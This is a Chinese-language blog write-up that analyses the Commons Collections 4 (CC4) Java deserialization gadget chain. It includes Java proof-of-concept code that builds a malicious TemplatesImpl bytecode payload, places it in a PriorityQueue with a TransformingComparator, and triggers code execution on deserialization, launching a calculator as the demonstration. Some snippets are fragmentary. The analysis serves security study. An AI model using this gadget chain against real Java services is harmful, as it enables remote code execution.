Java反序列化CC4链

Sep 24, 2025
2 minute read

0x00 前言

CC指的是 Apache Commons Collections 库，该库是对 Java Collections 的一个扩展，旨在简化集合操作，并提供更强大和灵活的集合操作能力。

当前所记的CC4利用链与 Ysoserial 相同，基本为 CC2 的变种，用于绕过 InvokerTransformer 类被禁用的情况。涉及依赖库为Commons Collections4，可通过maven引入依赖：

0x01 漏洞链信息

1.1 利用限制

  • CC4 适用于 Commons Collections 4.x 环境。
  • 目标环境需要存在有漏洞的Apache Commons Collections库。
  • 漏洞利用需要依赖反射。

1.2 涉及的核心组件

组件类名功能/在利用链中承担的作用
TemplatesImpl执行者，执行任意代码
TrAXFilter触发点，触发执行器
InstantiateTransformer触发点，触发下一层触发点
TransformingComparator触发点，触发下一层触发点
PriorityQueue入口点，通过该类反序列化时的readObject方法引动触发点，触发利用链

0x02 漏洞分析

PriorityQueue …

从 Java反序列化CC2链 我们知道：

  • PriorityQueue类在满足一定条件下反序列化时，会调用到其comparator属性的compare()方法。comparator属性需要实现Comparator接口。
  • TransformingComparator类实现了Comparator接口，其compare()方法将调用其transformer属性的transform()方法。transformer属性需要实现Transformer接口。

    field.setAccessible(true);
    field.set(obj, value);

InstantiateTransformer …

从 Java反序列化CC3链 我们知道：

  • InstantiateTransformer 类实现了Transformer接口，其transform()方法会根据用户参数调用指定对象的构造方法创建一个实例。
  • TrAXFilter类的构造方法中会调用传入参数templates的newTransformer()方法。参数templates需要实现Templates接口。
  • TemplatesImpl类实现了Templates接口，受控情况下调用其newTransformer()方法可以执行任意代码(TemplatesImpl恶意利用)。

    clazz.setSuperclass(pool.get(AbstractTranslet.class.getName()));
    byte[][] bytes = new byte[][]{clazz.toBytecode()};
    
    TemplatesImpl templates = TemplatesImpl.class.newInstance();
    Reflections.setFieldValue(templates, "_bytecodes", bytes);
    Reflections.setFieldValue(templates, "_name", "Evil_CC");
    Reflections.setFieldValue(templates, "_tfactory", new TransformerFactoryImpl());

    return templates;
}

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.util.Comparator;
import java.util.PriorityQueue;
import javax.xml.transform.Templates;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

public class CC4 {
    public static void main(String[] args) throws Exception {
        Templates templates = Gadgets.createTemplatesImpl("open -a Calculator");
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        Transformer transformer = new ChainedTransformer(new Transformer[]{
            new ConstantTransformer(TrAXFilter.class),
            instantiateTransformer});
        
        Comparator comparator = new TransformingComparator(transformer);
        PriorityQueue queue = new PriorityQueue<>(2);
        queue.add(1);
        queue.add(1);
        Reflections.setFieldValue(queue, "comparator", comparator);

        // 序列化
        ByteArrayOutputStream baos = new ByteArrayOutputStream();
        ObjectOutputStream oos = new ObjectOutputStream(baos);
        oos.writeObject(queue);
        oos.flush();
        oos.close();

        // 反序列化触发
        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(baos.toByteArray()));
        ois.readObject();
    }
}
